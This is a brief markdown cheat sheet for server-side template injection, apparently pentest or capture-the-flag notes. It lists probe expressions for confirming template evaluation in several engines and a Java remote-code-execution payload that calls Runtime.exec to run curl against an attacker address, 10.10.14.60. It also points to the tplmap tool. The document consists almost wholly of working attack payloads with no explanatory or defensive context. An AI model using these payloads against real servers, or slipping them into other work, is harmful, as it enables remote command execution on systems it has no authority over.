# SSTI

### Confirmation

```
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
*{7*7}
```

### RCE

```
*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("curl%20http://10.10.14.60")}
```

### Tools

```
https://github.com/epinna/tplmap
```
